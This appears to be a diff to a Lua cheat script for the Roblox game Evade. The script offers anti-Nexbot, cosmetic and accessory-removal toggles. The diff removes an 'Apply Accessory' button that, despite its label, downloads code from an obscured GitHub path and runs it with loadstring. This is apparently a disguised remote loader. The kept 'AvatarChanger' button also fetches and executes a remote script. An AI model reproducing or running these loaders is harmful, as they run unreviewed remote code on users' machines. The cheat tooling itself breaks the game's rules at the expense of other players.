@@ -17,7 +17,7 @@ _G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm-Hub-X - Evade Legacy│Mobile",
-    SubTitle = "v2.21.14 Made By Carey",
+    SubTitle = "v2.22.19 Made By Carey",
     TabWidth = 160,
     Size = UDim2.fromOffset(540, 390),
     Acrylic = false,
@@ -29,7 +29,6 @@ local Tabs = {
     Main = Window:AddTab({ Title = "Main", Icon = "rbxassetid://7733960981" }),
     Nexbots = Window:AddTab({ Title = "Anti Nexbots", Icon = "shield" }),
     Misc = Window:AddTab({ Title = "Misc", Icon = "rbxassetid://7734068321" }),
-    Exploits = Window:AddTab({ Title = "Exploits", Icon = "bomb" }),
     Visual = Window:AddTab({ Title = "Visual", Icon = "rbxassetid://10709819149" }),
     Info = Window:AddTab({ Title = "Info", Icon = "rbxassetid://10723415903" }),
     Settings = Window:AddTab({ Title = "Configuration", Icon = "rbxassetid://7734052335" }),
@@ -3296,48 +3295,6 @@ RunService.Heartbeat:Connect(function()
     RunService.RenderStepped:Wait()
 end)
 
--- Exploits
-
-Tabs.Exploits:AddInput("AssetID", {
-    Title = "Custom Accessory ID",
-    Default = "",
-    Numeric = true,
-    Callback = function(Value)
-        _G.SavedID = tonumber(Value)
-    end
-})
-
-Tabs.Exploits:AddButton({
-    Title = "Apply Accessory",
-    Callback = function()
-        if _G.SavedID then
-            local success, code = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/.github/.gist ")
-            if success then
-                local func = loadstring(code)
-                if func then
-                    func()
-                end
-            end
-        end
-    end
-})
-
-
-Tabs.Exploits:AddButton({
-    Title = "No Accessories",
-    Callback = function()
-        local char = game.Players.LocalPlayer.Character
-        if char then
-            for _, obj in ipairs(char:GetChildren()) do
-                if obj:IsA("Accessory") then
-                    obj:Destroy()
-                end
-            end
-        end
-    end
-})
-
- 
 -- Visual
 
 local ItemsFolder = ReplicatedStorage.Items
@@ -3658,7 +3615,6 @@ _G.Headless_Enabled = false
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
-
 local function applyKorblox(side, meshId)
     local char = player.Character
     if not char then return end
@@ -3687,12 +3643,14 @@ local function applyHeadless()
         head.Transparency = 1
         if head:FindFirstChild("face") then head.face:Destroy() end
         
-        local mesh = Instance.new("SpecialMesh")
-        mesh.Name = "HeadlessMesh"
-        mesh.MeshType = Enum.MeshType.FileMesh
-        mesh.MeshId = "rbxassetid://1095708"
-        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
-        mesh.Parent = head
+        if not head:FindFirstChild("HeadlessMesh") then
+            local mesh = Instance.new("SpecialMesh")
+            mesh.Name = "HeadlessMesh"
+            mesh.MeshType = Enum.MeshType.FileMesh
+            mesh.MeshId = "rbxassetid://1095708"
+            mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
+            mesh.Parent = head
+        end
     end
 end
 
@@ -3700,14 +3658,12 @@ local function revertChanges()
     local char = player.Character
     if not char then return end
     
-   
     local head = char:FindFirstChild("Head")
     if head then
         head.Transparency = 0
         local mesh = head:FindFirstChild("HeadlessMesh")
         if mesh then mesh:Destroy() end
     end
-    
     
     for _, legName in pairs({"Right Leg", "RightUpperLeg", "Left Leg"}) do
         local leg = char:FindFirstChild(legName)
@@ -3719,11 +3675,22 @@ local function revertChanges()
     end
 end
 
+task.spawn(function()
+    while true do
+        if _G.KorbloxR_Enabled then applyKorblox("Right", "rbxassetid://101851696") end
+        if _G.KorbloxL_Enabled then applyKorblox("Left", "rbxassetid://101851582") end
+        if _G.Headless_Enabled then applyHeadless() end
+        
+        if not _G.KorbloxR_Enabled and not _G.KorbloxL_Enabled and not _G.Headless_Enabled then
+            revertChanges()
+        end
+        task.wait(0.1)
+    end
+end)
+
 player.CharacterAdded:Connect(function(char)
-    task.wait(1) 
-    if _G.KorbloxR_Enabled then applyKorblox("Right", "rbxassetid://101851696") end
-    if _G.KorbloxL_Enabled then applyKorblox("Left", "rbxassetid://101851582") end
-    if _G.Headless_Enabled then applyHeadless() end
+    char:WaitForChild("Humanoid")
+    revertChanges()
 end)
 
 Tabs.Extension:AddToggle("KorbloxRToggle", {
@@ -3732,11 +3699,7 @@ Tabs.Extension:AddToggle("KorbloxRToggle", {
     Default = false,
     Callback = function(Value)
         _G.KorbloxR_Enabled = Value
-        if Value then 
-            applyKorblox("Right", "rbxassetid://101851696") 
-        else 
-            revertChanges() 
-        end
+        if not Value then revertChanges() end
     end
 })
 
@@ -3746,11 +3709,7 @@ Tabs.Extension:AddToggle("KorbloxLToggle", {
     Default = false,
     Callback = function(Value)
         _G.KorbloxL_Enabled = Value
-        if Value then 
-            applyKorblox("Left", "rbxassetid://101851582") 
-        else 
-            revertChanges() 
-        end
+        if not Value then revertChanges() end
     end
 })
 
@@ -3760,11 +3719,7 @@ Tabs.Extension:AddToggle("HeadlessToggle", {
     Default = false,
     Callback = function(Value)
         _G.Headless_Enabled = Value
-        if Value then 
-            applyHeadless() 
-        else 
-            revertChanges() 
-        end
+        if not Value then revertChanges() end
     end
 })
 
@@ -3963,9 +3918,45 @@ Tabs.Extension:AddToggle("TogDoomsekkar", {
     end
 })
 
+Tabs.Extension:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+_G.DeleteHatsEnabled = false
+
+task.spawn(function()
+    while true do
+        if _G.DeleteHatsEnabled then
+            local char = player.Character
+            if char then
+                for _, v in ipairs(char:GetChildren()) do 
+                    if v:IsA("Accessory") then
+                        v:Destroy() 
+                    end
+                end
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+
+Tabs.Extension:AddToggle("DeleteHats", {
+    Title = "Remove Accessories",
+    Description = "",
+    Default = false,
+    Callback = function(Value)
+        _G.DeleteHatsEnabled = Value
+    end
+})
+
+
 Tabs.Extension:AddButton({
     Title = "AvatarChanger",
-    Description = "",
+    Description = "By byteed",
     Callback = function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-client-avatar-changer-92130"))()
     end
@@ -4871,7 +4862,7 @@ end)
 
     Tabs.Extension:AddToggle("FpsUnlockToggle", {
         Title = "Unlock FPS",
-        Description = "Removes the frame rate cap",
+        Description = "",
         Default = false,
         Callback = function(Value)
             FpsConfig.Enabled = Value
